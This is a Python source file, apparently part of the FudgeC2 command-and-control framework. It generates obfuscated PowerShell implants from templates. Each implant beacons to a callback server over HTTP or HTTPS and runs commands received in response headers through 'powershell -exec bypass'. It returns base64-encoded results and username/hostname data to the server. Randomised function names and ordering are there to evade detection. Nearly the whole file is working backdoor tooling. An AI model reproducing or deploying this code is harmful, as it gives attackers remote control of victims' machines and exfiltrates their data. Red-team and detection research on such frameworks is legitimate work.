import jinja2
import string
import random

class ImplantGenerator:
    # ImplantGenerator has a single public method (generate_implant_from_template)
    #   which is used to generate a new active implant in the event of a stager
    #   calling back. Configuration from the implant template is used to determine
    #   which functionality should be embedded within the active implant.

    JinjaRandomisedArgs = {"rnd_function": "aaaaaa",
                           "obf_remote_play_audio": "RemotePlayAudio",
                           "obf_sleep": "sleep",
                           "obf_collect_sysinfo": "collect_sysinfo",
                           "obf_http_conn": "http-connection",
                           "obf_https_conn": "https-connection",
                           "obf_dns_conn": "dns-connection"
                           }

    play_audio = '''
function {{ ron.obf_remote_play_audio }} {
    $args[0]
}
'''
# -- TODO: Create implant persistence.
    fde_func_a = '''
function aaaaaa() {}
    '''
    fde_func_b = '''
function bbbbbb(){
    $hostN = hostname
    $final_str = $env:UserName+"::"+$hostN
    $Script:tr = $final_str
    write-output $Script:tr
}
    '''

    update_implant = '''
function {{ ron.obf_collect_sysinfo }} ($a) {
    $b=($a -split "::")
    if ($b -Like " sys_info") {
        write-output "collecting sys_info"
        bbbbbb(0)
    } else {
        Write-Output $b
    }
}
        '''
    random_function = '''
function {{ ron.rnd_function }} () {}
        '''
    http_function = '''
function {{ ron.obf_http_conn }}(){
    $Body =  @{username='me';moredata='qwerty'}
    $headers = @{}
    $headers.Add("X-Implant","{{ uii }}")
    try {
        $URL = "http://"+$sgep+":{{ http_port }}/index"
        $LoginResponse = Invoke-WebRequest $URL -Headers $headers -Body $Body -Method 'POST'
        $kni = $LoginResponse.Headers['X-Command']
    }
    catch {
        $kni = "=="
    }
    return $kni
}
    '''

    https_function = '''
function {{ ron.obf_https_conn }}(){
    try {
        $URL = "https://"+$sgep+":{{ https_port }}/index"
        $kk = [System.Net.WebRequest]::Create($URL);
        $kk.Method = "POST"
        $kk.Headers.Add("X-Implant","{{ uii }}")
        $kk.Timeout = 10000;
        $LoginResponse = $kk.GetResponse()
        $bb = $LoginResponse.Headers["X-Command"]
        $LoginResponse.dispose()
    }
    catch [system.exception] {
        $LoginResponse.dispose()
        $bb = "=="
    }
    return $bb
}
    '''

    implant_main = '''
start-sleep({{ initial_sleep }})
${{ ron.obf_sleep }}={{ beacon }}
$sgep = "{{url}}"
while($true){
    start-sleep(${{ ron.obf_sleep }})
    try {
        {{ proto_core }}
    }
    catch {
        $_.Exception | format-list -Force
    }
    # Write-Output "$headers"
    if ( $headers -NotLike "=="){
        write-output "Non-sleep value"
        if ( $headers.Substring(0,2) -Like "::") {
            {{ ron.obf_collect_sysinfo }}($headers)
        } else {
            $tr = powershell.exe -exec bypass -C "$headers"
        }
        # -- If command issued this is the pre-return processing.
        $atr = $tr-join "`n"
        $gtr="{{ uii }}::$atr"
        Write-Output $gtr
        $headers = @{}
        $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
        $headers.Add("X-Result",$b64tr)
        $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ http_port }}/help' -Headers $headers -Body $Body -Method 'POST'
    }
}
    '''

    def _manage_implant_function_order(self, implant_info, function_list):
        # -- This is responsible for randomising the function order within the generated implant.
        if implant_info['obfuscation_level'] >= 1:
            random.shuffle(function_list)
        constructed_base_implant = ""
        for implant_function in function_list:
            constructed_base_implant = constructed_base_implant + implant_function
        constructed_base_implant = constructed_base_implant + self.implant_main
        return constructed_base_implant

    def _function_name_obfuscation(self, implant_info, function_names):
        if implant_info['obfuscation_level'] >= 2:
            for key in function_names.keys():
                letters = string.ascii_lowercase
                temp_string = ''.join(random.choice(letters) for i in range(8))
                if temp_string not in function_names.values():
                    function_names[key] = temp_string
        return function_names

    def _process_modules(self, implant_data, randomised_function_names):
        # --  New in Dwarven Blacksmith
        # Add default functions to added to the implant which will be randomised.
        implant_functions = [self.play_audio,
                             self.random_function,
                             self.update_implant,
                             self.fde_func_a,
                             self.fde_func_b]

        # Checks which protocols should be embedded into the implant.
        if implant_data['comms_http'] is not None:
            implant_functions.append(self.http_function)
        if implant_data['comms_https'] is not None:
            implant_functions.append(self.https_function)
        # TODO: These protocols will be delivered in later iterations of FudgeC2
        # if id['comms_dns'] != None:
        #     implant_functions.append(self.https_function)
        # if id['comms_binary'] != None:
        #     implant_functions.append(self.https_function)

        constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)

        # Generates the blob of code which will be used to determine which protocol should be selected from.
        protocol_string = ""
        proto_count = 0
        proto_list = {'comms_http': randomised_function_names['obf_http_conn'],
                      'comms_https': randomised_function_names['obf_https_conn'],
                      'comms_dns': randomised_function_names['obf_dns_conn']}

        for x in proto_list.keys():
            if implant_data[x] is not 0:
                protocol_string = protocol_string + "    " + str(proto_count) + " { $headers = " + proto_list[x] + " }\n"
                proto_count += 1

        f_str = 'switch ( get-random('+str(proto_count)+') ){ \n'+protocol_string+'     }'
        return constructed_implant, f_str

    def generate_implant_from_template(self, implant_data):
        # --  New in Tauren Herbalist
        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)

        implant_template, protocol_switch = self._process_modules(implant_data, implant_function_names)
        print(protocol_switch)
        cc = jinja2.Template(implant_template)
        output_from_parsed_template = cc.render(
            initial_sleep=implant_data['initial_delay'],
            http=12345,
            url=implant_data['callback_url'],
            http_port=implant_data['comms_http'],
            https_port=implant_data['comms_https'],
            dns_port=implant_data['comms_dns'],
            uii=implant_data['unique_implant_id'],
            ron=implant_function_names,
            beacon=implant_data['beacon'],
            proto_core=protocol_switch
        )
        return output_from_parsed_template


blah = '''
render_implant (Public)
 - Takes the generated implant info (Generated implants (by UIK)
 
process_modules 
 - This controls which protocols and additional modules are embedded into the implant.
 - Generates the main function multi proto selection

'''
